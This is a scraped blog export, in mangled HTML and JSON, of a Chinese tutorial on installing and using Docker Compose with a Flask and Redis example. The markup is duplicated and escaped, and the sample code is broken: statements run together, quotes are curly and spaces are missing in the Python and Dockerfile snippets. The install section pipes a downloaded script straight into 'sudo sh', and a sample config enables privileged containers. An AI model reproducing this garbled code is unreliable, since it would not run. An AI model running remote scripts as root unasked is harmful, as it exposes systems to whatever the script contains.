style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">cpu_shares:73\nworking_dir:/code\nentrypoint: /code/entrypoint.sh\nuser: postgresql\nhostname: foo\ndomainname: foo.com\nmem_limit:1000000000\nprivileged:true\nrestart: always\nstdin_open:true\ntty:true</textarea></div>\n\t\t\t<div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\">\n\t\t\t\t<table class=\"crayon-table\">\n\t\t\t\t\t<tbody><tr class=\"crayon-row\">\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c72058180962-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c72058180962-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c72058180962-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c72058180962-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c72058180962-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c72058180962-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c72058180962-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c72058180962-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c72058180962-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c72058180962-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c72058180962-11\">11</div></div>\n\t\t\t\t</td>\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c72058180962-1\"><span class=\"crayon-v\">cpu_shares</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">73</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c72058180962-2\"><span class=\"crayon-v\">working_dir</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">code</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c72058180962-3\"><span class=\"crayon-v\">entrypoint</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">code</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">entrypoint</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sh</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c72058180962-4\"><span class=\"crayon-v\">user</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">postgresql</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c72058180962-5\"><span class=\"crayon-v\">hostname</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">foo</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c72058180962-6\"><span class=\"crayon-v\">domainname</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">foo</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c72058180962-7\"><span class=\"crayon-v\">mem_limit</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1000000000</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c72058180962-8\"><span class=\"crayon-v\">privileged</span><span class=\"crayon-o\">:</span><span class=\"crayon-t\">true</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c72058180962-9\"><span class=\"crayon-v\">restart</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">always</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c72058180962-10\"><span class=\"crayon-v\">stdin_open</span><span class=\"crayon-o\">:</span><span class=\"crayon-t\">true</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c72058180962-11\"><span class=\"crayon-v\">tty</span><span class=\"crayon-o\">:</span><span class=\"crayon-t\">true</span></div></div></td>\n\t\t\t\t\t</tr>\n\t\t\t\t</tbody></table>\n\t\t\t</div>\n\t\t</div>\n<!-- [Format Time: 0.0013 seconds] -->\n<p></p>\n<h2>4. docker-compose常用命令</h2>\n<p>在第二节中的<code>docker-compose up</code>，这两个容器都是在前台运行的。我们可以指定-d命令以daemon的方式启动容器。除此之外，docker-compose还支持下面参数：<br>\n<code>--verbose</code>：输出详细信息<br>\n<code>-f</code> 制定一个非docker-compose.yml命名的yaml文件<br>\n<code>-p</code> 设置一个项目名称（默认是directory名）<br>\ndocker-compose的动作包括：<br>\n<code>build</code>：构建服务<br>\n<code>kill -s SIGINT</code>：给服务发送特定的信号。<br>\n<code>logs</code>：输出日志<br>\n<code>port</code>：输出绑定的端口<br>\n<code>ps</code>：输出运行的容器<br>\n<code>pull</code>：pull服务的image<br>\n<code>rm</code>：删除停止的容器<br>\n<code>run</code>: 运行某个服务，例如docker-compose run web python manage.py shell<br>\n<code>start</code>：运行某个服务中存在的容器。<br>\n<code>stop</code>:停止某个服务中存在的容器。<br>\n<code>up</code>：create + run + attach容器到服务。<br>\n<code>scale</code>：设置服务运行的容器数量。例如：docker-compose scale web=2 worker=3<br>\n参考:<br>\n<a href=\"http://docs.docker.com/compose/\">Compose Document</a></p>\n\t\t\t\t\t\t<div class=\"clear\"></div>\n\t\t\t\t\t\t\t\t\t\t\t</div>\n                                            \n>转载:http://debugo.com/docker-compose\n                                   ","slug":"Docker-Compose—简化复杂应用的利器","published":1,"updated":"2016-10-15T18:11:28.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciubisk8v00023son0swr7kwa","content":"<div class=\"entry-content\"><br>                                                <p>Compose是用于定义和运行复杂Docker应用的工具。你可以在一个文件中定义一个多容器的应用，然后使用一条命令来启动你的应用，然后所有相关的操作都会被自动完成。<span id=\"more-1319\"></span></p><br><h2>1. 安装Docker和Compose</h2><br><p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta --><br><br>        <div id=\"crayon-580270f9a8c25730712728\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\"><br><br>            <div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\"># 当前最新的Docker是1.6.2，Compose为1.2.0<br>curl -s <a href=\"https://get.docker.io/ubuntu/\" target=\"_blank\" rel=\"external\">https://get.docker.io/ubuntu/</a> | sudo sh<br>sudo apt-get update<br>sudo apt-get install lxc-docker<br># 参考<a href=\"http://docs.docker.com/compose/install/#install-compose\" target=\"_blank\" rel=\"external\">http://docs.docker.com/compose/install/#install-compose</a><br>curl -L <a href=\"https://github.com/docker/compose/releases/download/1.2.0/docker-compose-`uname\" target=\"_blank\" rel=\"external\">https://github.com/docker/compose/releases/download/1.2.0/docker-compose-`uname</a> -s<code>-</code>uname -m<code>&amp;gt; /usr/local/bin/docker-compose\nchmod +x /usr/local/bin/docker-compose\n### 上面这个方法真的慢出翔，可以通过Python pip安装。\napt-get install python-pip python-dev\npip install -U docker-compose&lt;/textarea&gt;&lt;/div&gt;\n            &lt;div class=&quot;crayon-main&quot; style=&quot;position: relative; z-index: 1; overflow: hidden;&quot;&gt;\n                &lt;table class=&quot;crayon-table&quot;&gt;\n                    &lt;tbody&gt;&lt;tr class=&quot;crayon-row&quot;&gt;\n                &lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;\n                    &lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 12px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-580270f9a8c25730712728-1&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-580270f9a8c25730712728-2&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-580270f9a8c25730712728-3&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-580270f9a8c25730712728-4&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-580270f9a8c25730712728-5&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-580270f9a8c25730712728-6&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-580270f9a8c25730712728-7&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-580270f9a8c25730712728-8&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-580270f9a8c25730712728-9&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-580270f9a8c25730712728-10&quot;&gt;10&lt;/div&gt;&lt;/div&gt;\n                &lt;/td&gt;\n                        &lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-580270f9a8c25730712728-1&quot;&gt;&lt;span class=&quot;crayon-p&quot;&gt;# 当前最新的Docker是1.6.2，Compose为1.2.0&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-580270f9a8c25730712728-2&quot;&gt;&lt;span class=&quot;crayon-v&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//get.docker.io/ubuntu/ | sudo sh&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-580270f9a8c25730712728-3&quot;&gt;&lt;span class=&quot;crayon-e&quot;&gt;sudo &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;apt&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;get &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;update&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-580270f9a8c25730712728-4&quot;&gt;&lt;span class=&quot;crayon-e&quot;&gt;sudo &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;apt&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;get &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;install &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;lxc&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;docker&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-580270f9a8c25730712728-5&quot;&gt;&lt;span class=&quot;crayon-p&quot;&gt;# 参考http://docs.docker.com/compose/install/#install-compose&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-580270f9a8c25730712728-6&quot;&gt;&lt;span class=&quot;crayon-v&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//github.com/docker/compose/releases/download/1.2.0/docker-compose-</code>uname -s<code>-</code>uname -m` &gt; /usr/local/bin/docker-compose</textarea></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c25730712728-7\"><span class=\"crayon-v\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">compose</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c25730712728-8\"><span class=\"crayon-p\">### 上面这个方法真的慢出翔，可以通过Python pip安装。</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c25730712728-9\"><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">get </span><span class=\"crayon-e\">install </span><span class=\"crayon-v\">python</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">pip </span><span class=\"crayon-v\">python</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">dev</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c25730712728-10\"><span class=\"crayon-e\">pip </span><span class=\"crayon-v\">install</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">U</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">compose</span></div></div><br>                    <br>                <br>            </div><br>        <br><!-- [Format Time: 0.0020 seconds] --><br><p></p><br><p>这样compose就安装好了，查看一下compose的版本信息：</p><br><p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta --><br><br>        <div id=\"crayon-580270f9a8c44835397497\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\"><br><br>            <div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">chmod +x /usr/local/bin/docker-compose<br>docker-compose -version<br>docker-compose 1.2.0</textarea></div><br>            <div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\"><br>                <table class=\"crayon-table\"><br>                    <tbody><tr class=\"crayon-row\"><br>                <td class=\"crayon-nums \" data-settings=\"show\"><br>                    <div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c44835397497-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c44835397497-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c44835397497-3\">3</div></div><br>                </td><br>                        <td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c44835397497-1\"><span class=\"crayon-r\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">compose</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c44835397497-2\"><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">compose</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">version</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c44835397497-3\"><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">compose</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.2.0</span></div></div></td><br>                    </tr><br>                </tbody></table><br>            </div><br>        </div><br><!-- [Format Time: 0.0011 seconds] --><br><p></p><br><h2>2. 使用Compose</h2><br><p>使用Compose只需要简单的三个步骤：<br><br>首先，使用Dockerfile来定义你的应用环境：</p><br><p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta --><br><br>        <div id=\"crayon-580270f9a8c48878639680\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\"><br><br>            <div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">FROM python:2.7<br>ADD ./code<br>WORKDIR /code<br>RUN pip install -r requirements.txt</textarea></div><br>            <div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\"><br>                <table class=\"crayon-table\"><br>                    <tbody><tr class=\"crayon-row\"><br>                <td class=\"crayon-nums \" data-settings=\"show\"><br>                    <div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c48878639680-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c48878639680-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c48878639680-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c48878639680-4\">4</div></div><br>                </td><br>                        <td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c48878639680-1\"><span class=\"crayon-e\">FROM </span><span class=\"crayon-v\">python</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">2.7</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c48878639680-2\"><span class=\"crayon-i\">ADD</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">code</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c48878639680-3\"><span class=\"crayon-v\">WORKDIR</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">code</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c48878639680-4\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-e\">pip </span><span class=\"crayon-v\">install</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">r</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">requirements</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span></div></div></td><br>                    </tr><br>                </tbody></table><br>            </div><br>        </div><br><!-- [Format Time: 0.0008 seconds] --><br><p></p><br><p>其中，requirements.txt中的内容包括：</p><br><p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta --><br><br>        <div id=\"crayon-580270f9a8c4d809478886\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\"><br><br>            <div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">flask<br>redis</textarea></div><br>            <div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\"><br>                <table class=\"crayon-table\"><br>                    <tbody><tr class=\"crayon-row\"><br>                <td class=\"crayon-nums \" data-settings=\"show\"><br>                    <div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c4d809478886-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c4d809478886-2\">2</div></div><br>                </td><br>                        <td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c4d809478886-1\"><span class=\"crayon-e\">flask</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c4d809478886-2\"><span class=\"crayon-v\">redis</span></div></div></td><br>                    </tr><br>                </tbody></table><br>            </div><br>        </div><br><!-- [Format Time: 0.0003 seconds] --><br><p></p><br><p>再用Python写一个简单的app.py</p><br><p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta --><br><br>        <div id=\"crayon-580270f9a8c51291884198\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\"><br><br>            <div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">from flask importFlaskfrom redis importRedisimport os<br>app =Flask(<strong>name</strong>)<br>redis =Redis(host=’redis’, port=6379)@app.route(‘/‘)def hello():<br>    redis.incr(‘hits’)return’Hello World! I have been seen %s times.’% redis.get(‘hits’)if <strong>name</strong> ==”<strong>main</strong>“:<br>    app.run(host=”0.0.0.0”, debug=True)</textarea></div><br>            <div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\"><br>                <table class=\"crayon-table\"><br>                    <tbody><tr class=\"crayon-row\"><br>                <td class=\"crayon-nums \" data-settings=\"show\"><br>                    <div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c51291884198-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c51291884198-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c51291884198-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c51291884198-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c51291884198-5\">5</div></div><br>                </td><br>                        <td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c51291884198-1\"><span class=\"crayon-st\">from</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">flask </span><span class=\"crayon-e\">importFlaskfrom </span><span class=\"crayon-e\">redis </span><span class=\"crayon-e\">importRedisimport </span><span class=\"crayon-k \">os</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c51291884198-2\"><span class=\"crayon-v\">app</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">Flask</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\"><strong>name</strong></span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c51291884198-3\"><span class=\"crayon-v\">redis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">Redis</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">host</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">‘redis’</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">port</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">6379</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">app</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">route</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">‘/‘</span><span class=\"crayon-sy\">)</span><span class=\"crayon-r\">def</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">hello</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c51291884198-4\"><span class=\"crayon-h\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">incr</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">‘hits’</span><span class=\"crayon-sy\">)</span><span class=\"crayon-st\">return</span><span class=\"crayon-s\">‘Hello World! I have been seen %s times.’</span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">‘hits’</span><span class=\"crayon-sy\">)</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\"><strong>name</strong></span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-s\">“<strong>main</strong>“</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c51291884198-5\"><span class=\"crayon-h\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class=\"crayon-v\">app</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">run</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">host</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">“0.0.0.0”</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">debug</span><span class=\"crayon-o\">=</span><span class=\"crayon-t\">True</span><span class=\"crayon-sy\">)</span></div></div></td><br>                    </tr><br>                </tbody></table><br>            </div><br>        </div><br><!-- [Format Time: 0.0027 seconds] --><br><p></p><br><p><strong>第二步</strong>，用一个compose.yaml来定义你的应用服务，他们可以把不同的服务生成不同的容器中组成你的应用。</p><br><p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta --><br><br>        <div id=\"crayon-580270f9a8c55508636029\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\"><br><br>            <div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">web:<br>  build:.<br>  command: python app.py<br>  ports:<br>         - “5000:5000”<br>  volumes:<br>         - .:/code<br>  links:<br>         - redis<br>redis:<br>  image: redis</textarea></div><br>            <div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\"><br>                <table class=\"crayon-table\"><br>                    <tbody><tr class=\"crayon-row\"><br>                <td class=\"crayon-nums \" data-settings=\"show\"><br>                    <div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c55508636029-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c55508636029-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c55508636029-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c55508636029-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c55508636029-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c55508636029-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c55508636029-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c55508636029-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c55508636029-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c55508636029-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c55508636029-11\">11</div></div><br>                </td><br>                        <td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; 